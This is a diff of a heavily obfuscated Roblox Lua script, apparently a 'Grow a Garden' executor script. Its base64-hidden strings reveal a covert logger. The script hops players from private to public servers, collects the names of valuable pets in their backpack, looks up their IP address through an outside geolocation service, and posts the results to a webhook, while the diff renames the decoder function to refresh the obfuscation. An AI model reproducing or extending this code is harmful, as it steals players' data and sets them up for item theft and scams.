+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GoDUIjfuekYlZRTdFuntqrDrKivVkCrBNupSfZqXuuNxBGJzPGSNzMcVHJpY2VyYXRvcHM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZZJiKxBpZIUJfPqUxvrSJbLihyTmytfVXtzbmYVchmlYRGiwQMSqBurU3RlZ29zYXVydXM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('wDaTcXRcuWqAJqBtJTaIjWsRazVAssPvJFTIEqBNlHiEogMhKomHBFOUHRlcm9kYWN0eWw='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UkZMnlEmMTyEQDaYGRCsykbLymqCEdHQJXKTWTFAKdmZHeQbnCtFvccVHVydGxl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('fvggjRqdJvNnWSGFOnYkIqzzFULrjZPsUtkyKytlfWbCIFXePZeJNncQ2F0ZXJwaWxsYXI='),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WkrVqaFkiPLagHmakAWCKxxzgNtyUGbRZrisBJDHCIWmBLDqgSbYTGqUGV0YWwgQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BQhpERblsPLCpVsJlmNYfoUKTbcOpPocdrbrFjeUDjTzynDfaermxCZTW90aA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BZQToHpPMXvhWMswvQDodsZOSxTbbUnGWLWCMJuApaksRZObdrFGFKLU2NhcmxldCBNYWNhdw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('digCEMDOEfUoXkQWWhgPcvfAbFMNtzPonDcDhBAsaCCABYAUfYHhQmUT3N0cmljaA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZkkicHXSMdLlFqTlBLiKYfJLJXvINzqHqayUVaxRHhyAiLBPyQydsmdUGVhY29jaw=='),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HjbujtxOPcyHTQhRSEFEMJiNDosNizNEljsfkfyCKTuWTPWnHYLLuJzQ2FweWJhcmE='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('xZrSsqVsFNuCvstGZoHwZIQXasDAxwqzzmEzdCuwcaqrGhLfnBdptdOU2FuZCBTbmFrZQ=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lArYEfbeuHSaXrgjutGeBfliwGMWUpgdwyecCDnXkCjinZMndfbbNGlTWVlcmthdA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oraKAtlkPRESCBtLAYakromCybHKmvIFMWzfzgvYzkjjBBVtURReJPdQnJvd24gTW91c2U='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QMdtKoQuUkCiFjzdaVVwOkWEflfWYooSblLzmWODxOiLjmCjNYfrQHWR2lhbnQgQW50'),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oLUlleRBHIhOSNPTBoCsSKezWUIpInpVRRyvtxHoRqGCndeOsPoOAbCR3JleSBNb3VzZQ=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZymAsnpkUoTJMSDiBhyEKwuIZUesmaxrWrHjtJorocPyDNIXXkcEDXQUHJheWluZyBNYW50aXM='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('eLoUlHKUAvffwLcfsDWBeXrYGNKVpgfSvtCKXCtJksdHkyYoThHjJtGUmVkIEdpYW50IEFudA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('StdZpyeNuqyyHBYUBYydLAHzwEtgOzBKrfihUZbKCzDDdsmcnsWcMPdU25haWw='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GwCouVcIkhAVouoZHOmZXpfmYMYrXPIIhGlaoLLKpvGgJvBuleZvQflU3F1aXJyZWw='),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KzVlhVkSZfnlcnMqxRFOLPWtthIksMPuvcyvnKmmvzNcgyAYbnVDGhZQmVhciBCZWU='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XzpVjIWOZeAsGqQWaVLDmvWBpaJGWMtPIiKlZqZzOivLGluDqOsXqoSQnV0dGVyZmx5'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UrbvWwnGsyRlwerYuOYGpfgXIFmHzlLudBBgIwyrrOUDrkvyZdNgBYBQnJvbnRvc2F1cnVz'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('kkXgbBamfcuxvSGjFOddKqHbVhAPdfVvGEiaYcmDeFtlrWqqLBovUwdUGFjayBCZWU='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('nxRpYETlnSuPIjNxPYIpErWWcYmMbzGarIpbFlsqkmGeTAvjpGtOirNTWltaWMgT2N0b3B1cw=='),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GRkSZgZGolxNPqpmyfoPwowblRhXAzHlcuJDtQkEPtblTQimjaZtpPHSHlhY2ludGggTWFjYXc='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('gByenVUVAcrpJqupJPZXBQobhcLUNKHLqlSlTwGUEQsPLotwkAaGiOyQXhvbG90bA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('PZIldNeEGbtmeHRkehSrilPWLrtnlrdJYKfpNppMHFWVYSRWMwzeOybUmVkIEZveA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('waBoiSJhNqJtsNihhEDjMnJCgAZtWGsXtnzyapQphquRknVCiCEtWkCVOKAkVJleA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('rrXWXsgzUpRkaecTfIhHMDBEbGfKOtoofUAAwTgGKJHOqUxOLUJxPAJRHJhZ29uZmx5'),
+    LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BKpBfEukbYRXcwdJsezVdqcGTurESKMUfVoLezffcxDSikhcgCgrbbPUXVlZW4gQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('rqHEocsdZVUIGHrVTYNcMeKGVKNkSDskpHwYxNcHaIejLGyaFzbIPcuRGlzY28gQmVl'), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('UdKflXGewWADQDHSIlSfkcuYCcsKcohZkutiRQvmPdATrAtYVmpkEVcRmVubmVjIEZveA=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZxYDMFUXrJoAJGtiFiIkbRqRdnbVObFJmTFCdLesomPgnbLLtuSxOwGTW9vbiBDYXQ='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('zGoZwaeEWZMCjCcyyoPDTlicTOlPesLPRlPoyBNvNoTpQoSvKYQSKlxUmFjY29vbg==')
 }
 
 -- SERVICES
-local Players = game:GetService(xAEhyCAEPqFXwK('WYYgnLPmMByhvmgTzEPzWWJcZoilSesGAhFxfTNqKhfpMrULKkIZjpVUGxheWVycw=='))
-local ReplicatedStorage = game:GetService(xAEhyCAEPqFXwK('ORIGmJvAgcWQxWZUFdgfDALZSnnzcCxsJKCckAQMoUWaWmRivKoshFZUmVwbGljYXRlZFN0b3JhZ2U='))
-local HttpService = game:GetService(xAEhyCAEPqFXwK('IkTqzcVxILnCsPrHhcmPYTDxTXocDPNRRtmDkqyQfLFiAOayLZAVTSQSHR0cFNlcnZpY2U='))
-local TeleportService = game:GetService(xAEhyCAEPqFXwK('iaMSBEREDVkunhJnjWHpKevUFlmpryOQRbnddJzKtjSPpPUtQUJxthCVGVsZXBvcnRTZXJ2aWNl'))
-local Lighting = game:GetService(xAEhyCAEPqFXwK('ClFhJEZGEluNtmiNvADlsAboBOByFsmPorNCqvKXWhJJAdXNyLrFeFtTGlnaHRpbmc='))
+local Players = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('lfgFObvpzdCOsmSeMLgENnxrCMZOiRxhEnBNfDywMZcNbvGCEHPQNjxUGxheWVycw=='))
+local ReplicatedStorage = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('qUmXTVpXZQbeoCXcxoMaDdpBwGQHIkNKPrYAwzZUSkOxkLGjPADseorUmVwbGljYXRlZFN0b3JhZ2U='))
+local HttpService = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('AwFnZAASLpXlSPTVQONwGNRXHyVSWYJOXuUasUDqFtZdkHOYALFyctaSHR0cFNlcnZpY2U='))
+local TeleportService = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HDJkpmfVdYpIrXRdMcxHNleBxVWLisXfgcCQzRoHEkyPEOcLWasbVROVGVsZXBvcnRTZXJ2aWNl'))
+local Lighting = game:GetService(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('dUCiBNoyNzDEujHJfaRUxhYawKxhgECCpjObaOSYMwmQIzVbvUmPpVUTGlnaHRpbmc='))
 local localPlayer = Players.LocalPlayer
-local backpack = localPlayer:WaitForChild(xAEhyCAEPqFXwK('UvirMlqIOGJPCQxCQxQQirdVSmDIHJSNGwxabPKvBZJgsVldSStInvAQmFja3BhY2s='))
+local backpack = localPlayer:WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('pZqiQYSoMYcZNUSfJdcgooXRpYPDmNzavStdJnnBWODCamFAAkOFTTNQmFja3BhY2s='))
 local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 local jobId = game.JobId
 local placeId = game.PlaceId
@@ -49,12 +50,12 @@ local placeId = game.PlaceId
 local function getLowestServer()
     local req = http_request or syn.request or request or fluxus.request
     if not req then return nil end
-    local cursor = xAEhyCAEPqFXwK('sqcNXDgwNkShozApdSZmnnFFHWqLWJqOoEeialAExpwElYkxzuYgvxj')
+    local cursor = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('peJiLTorUlpbKLGQIeMQJAQDzViufgJmYSOzQGOEHQPiOIBaPjfhOsV')
     local lowest = nil
     repeat
-        local url = xAEhyCAEPqFXwK('jPWmqYyYicoqJxBGxdJECbmtVcQRGUOidwfSSzKsUPweKLkSIrecRFWaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. xAEhyCAEPqFXwK('nQvRwODsqiRfWUNzHtBEsmoWQGmsnXXQdCaHdXSxrsRaUGgVCwZAgnOL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
-        if cursor ~= xAEhyCAEPqFXwK('blfnALUlfDlktSvYgDfLOABNQSQmzabryoahjTzaEIfXVAKmsFvZPlW') then url = url .. xAEhyCAEPqFXwK('ojfCISxHTrBHOXCrDMxkrgsDunzxVoZiiXKMVokddLKYtkdrPwPSNAIJmN1cnNvcj0=') .. cursor end
-        local response = req({ Url = url, Method = xAEhyCAEPqFXwK('GuHNeoJeXFUfMNAxpycIRDWZBYuLOwdzOeZzJauWxnlbhnuIQbUpAVaR0VU') })
+        local url = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mcwQrUwCTbuxDEaccMZKtwxwPzMuiHhKEaKeUvGaSzCDZyECBknKSiraHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NROyrtxufTxyphbNYNjUUJBSSbyWMYtEPgPUXVviVAXIwCtQcXvQyhkL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
+        if cursor ~= LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('JgLFcqMFClrFyyHQKQzHYerKDTuKMwQAYxNfdOjXDjxzzPhIvPthuxr') then url = url .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('dmepOkulwwbVTvZjaQOfmCgdmRquVCVTJOvBDepDGzbVDuZeJMXaXANJmN1cnNvcj0=') .. cursor end
+        local response = req({ Url = url, Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KFgxYAlbkrJaPaVGhrDqQyvPmdDnlUfCgzsnLQEfinHWIpsAnWLLSkJR0VU') })
         if response and response.Body then
             local data = HttpService:JSONDecode(response.Body)
             for _, server in pairs(data.data or {}) do
@@ -70,22 +71,22 @@ local function getLowestServer()
 end
 
 local wasPrivateServer = false
-if game.PrivateServerId ~= xAEhyCAEPqFXwK('lrBGMhudmtvUcSqlBULEWzDMOPorTdQOJnzOWiTczIAMSmKeXHutlMy') and game.PrivateServerOwnerId ~= 0 then
+if game.PrivateServerId ~= LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BSmAMIDSFQzbzYKWpDGdIPjKahkENHBvnKJdFLosvpmGvVVjJNUlsWF') and game.PrivateServerOwnerId ~= 0 then
     local lowestServer = getLowestServer()
     if lowestServer then
         wasPrivateServer = true
-        warn(xAEhyCAEPqFXwK('OCBMdwwOOxpeArfdKMezeWvTljddWlWKeEKnsQELdJOKkGmbmJDnonKWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
+        warn(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('zCKGAfYjBBqSYHSLpuTIupNfyDsnlkwSiTbsyNkkzLTWFjDOUDuFhPFWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
         task.wait(3)
         TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
         return
     else
-        warn(xAEhyCAEPqFXwK('smQWMcbiNNScEbFnPutWyzwRobhXggIbDASHpQfSbTaMxRkXfXccYPVWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
+        warn(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SkHqmLdlpbRrVrLTCOkcEsVgbFsiNadQCjNYOgfAuDRaJfnRPZnXgikWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
     end
 end
 
 -- HELPERS
 function freezeVisual()
-    local blur = Instance.new(xAEhyCAEPqFXwK('ftGtecgPqzRaAKQCIXoZOlCrEQRfVkcnAiJmSPntMZyuIwdHRJGsGcaQmx1ckVmZmVjdA=='))
+    local blur = Instance.new(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('aqPLDUcYWjMiwaOOPdoVouetJFjlbYIzmsfwrXgKaikIiOAphPsUZonQmx1ckVmZmVjdA=='))
     blur.Size = 999
     blur.Parent = Lighting
 end
@@ -102,7 +103,7 @@ end
 local function getFilteredPets()
     local filtered = {}
     for _, item in pairs(backpack:GetChildren()) do
-        if item:IsA(xAEhyCAEPqFXwK('nNCtDSswdupFwhMLQcCQYRPnTIdZpBnTUqUKcWVqXDFICKqBbBeEVUHVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
+        if item:IsA(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('fhWcDpEKLmGqJZqmDxkSgEbpCnigRKuKrOuzAVknpGaByKtXqhCRvoyVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
             table.insert(filtered, item.Name)
         end
     end
@@ -114,11 +115,11 @@ local function chunkItems(items)
     for i = 1, #items, 5 do
         local chunk = {}
         for j = i, math.min(i+4, #items) do
-            table.insert(chunk, xAEhyCAEPqFXwK('SwwlfLVKpUcBArfJvzjeXlnZHHaXzafOwPCuDKnkvpjGmHPGikRFfyhLSA=') .. items[j])
+            table.insert(chunk, LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NwaYqAeGpRyuwwrGZPnFFpKWeIhZjdPJHGtODjRIARPKLjhmcmxZhdnLSA=') .. items[j])
         end
         table.insert(chunks, {
-            name = xAEhyCAEPqFXwK('pTlypyDvqXeLibsXHuODXTXdMTozJenYbBDrhyZYSDRtOUUfhLnidjb8J+OkiBQZXRzIA==') .. tostring(i) .. xAEhyCAEPqFXwK('pSQmtUXpxYdeqHeFgMfWZepDWwdjLLEHsimOZYCEAqHzXeCDyUEglGz4oCT') .. tostring(math.min(i+4, #items)),
-            value = table.concat(chunk, xAEhyCAEPqFXwK('ufpZuvtXhcsAbsyzIVdMDimSJFcJabgNrtCkpXzfjsPVYGwqSykOUqFXG4=')),
+            name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oxguqHCGuoIkoIzoKHPbdvjlVizIlaEvKqhOBpwBoCrCymeMOLbPCDu8J+OkiBQZXRzIA==') .. tostring(i) .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('TQIgCZOqvHMZCgePotAAxqjwhBnjqcikSigFvpTsafJZecLEFsUjGcX4oCT') .. tostring(math.min(i+4, #items)),
+            value = table.concat(chunk, LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('jrJCsEvyPdcFhsQucevVDtIJuBTYAhLpiJfMvFxhoTsjgoybLtHFQtPXG4=')),
             inline = false
         })
     end
@@ -127,21 +128,21 @@ end
 
 local function sendWebhook(embedFields)
     local data = {
-        content = xAEhyCAEPqFXwK('BwhKAbFzBVsZGriHmTeksgdZpIIHrvHQHQlQsxaatTPZLSZDnJnAGcc'),
+        content = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('tujbWslnhMjNMWBzbYxwALSBoPwNQtyIQoMutniPOgMXuVXudURIdkw'),
         embeds = {{
-            title = xAEhyCAEPqFXwK('LYsSLNIfAhtDTtgIwxJPfMkkAYBLxhFDDyPsJcLRrMeHQfYYhwjcliD8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
+            title = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KdzYITNifRUGyagOgXAnShKVycmhVFXiGUBISEceGbeBnGQxIuEjkWC8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
             color = 16753920,
             fields = embedFields,
-            footer = { text = xAEhyCAEPqFXwK('XoyzssICBAKDeClTBlWCEogIkPylNFztryHNimCyQUXzfbctICqVtsARGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
-            timestamp = os.date(xAEhyCAEPqFXwK('kyfKZnYNoiOPnscrDAlfWfdyyMdxRWWAwaNfVWSzSzGvLWKHXzSHpkMISVZLSVtLSVkVCVIOiVNOiVTWg=='))
+            footer = { text = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('MFgpzkZQQrxEfrAESqNmIEXrYIBgzUpifVUMDMraQDCyEXTJMGoyfYaRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
+            timestamp = os.date(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HtSgDyODbouGntkaWByhpUVRZqAysMLoADNQZxTEBopWdBjUTXJnPmpISVZLSVtLSVkVCVIOiVNOiVTWg=='))
         }}
     }
     local req = http_request or request or syn.request or fluxus.request
     if req then
         req({
             Url = webhookUrl,
-            Method = xAEhyCAEPqFXwK('FajaIXuCDJIJAXtXXxehtlnePGXVVfIYQyuvxYLWMswxjoaoERGAjyiUE9TVA=='),
-            Headers = { [xAEhyCAEPqFXwK('FEUdoMSVEIwqILbowCEmGXdEksqjpuvtftjSRhHcuddwByOlrSULXIJQ29udGVudC1UeXBl')] = xAEhyCAEPqFXwK('XrqrJlOsIYpRWmElVYtXTpBvPlfLSsfIfxSDhTujpFyGxTeDLVclyBwYXBwbGljYXRpb24vanNvbg==') },
+            Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SEYSOmuIfhNUhilWTHDLEXHVAFEnXZPyefxnMBUtRkRIAUPetegpOzyUE9TVA=='),
+            Headers = { [LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QMegOJpNaMRkiFYFvoFvQCLYsxNYHNPnLgsqWhYqpsExhUGvpzeBYaVQ29udGVudC1UeXBl')] = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('JiNqEXwWYtVhQbcEakCuJzHbLKaCACHwjAOqgjuVgxFQRonMdGOiwODYXBwbGljYXRpb24vanNvbg==') },
             Body = HttpService:JSONEncode(data)
         })
     end
@@ -149,25 +150,25 @@ end
 
 local function getIPInfo()
     local req = http_request or request or syn.request or fluxus.request
-    if not req then return xAEhyCAEPqFXwK('ITYYHeNhLipEUKKEirHUBqYmlxpKgryhFPCchEKHdJcKOGMJejvPVbWVW5rbm93bg=='), xAEhyCAEPqFXwK('tLLYGSvBZRWWufidrgXWEhWdRtzyRxBusllQRaQrjOCtbuznvpkEYVuVW5rbm93bg=='), xAEhyCAEPqFXwK('XJlZIvHdYtKusFDprIORdruYMeDTDHxAecHqwUUiKohsHsqXSLQrMokVW5rbm93bg==') end
-    local result = req({ Url = xAEhyCAEPqFXwK('HHOBbVesPYiCoriYGkyPNqiRXfEgPfJkxnHJUSXmAZTdlupSUqltTvvaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = xAEhyCAEPqFXwK('UdJbZOcfgjFOSjnMckYSHkhhcEeizhXLaddyCipVNCJQhHStFgBLJZpR0VU') })
+    if not req then return LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sqjxbgitHqFvfNdmzdVxkJEmyOJtCuQGefMlBfwUTdsuvbswvkXdFxSVW5rbm93bg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('RxLxtprdMlBgMhoLNjUkSCHjVsObaERFmwdpfDkDTiJkxBfKjZaawVQVW5rbm93bg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('aUdJUxXRJcpSIniwyMXavhrlsAckuDtRkVYqcYwMyosEDwqGqVqfTxHVW5rbm93bg==') end
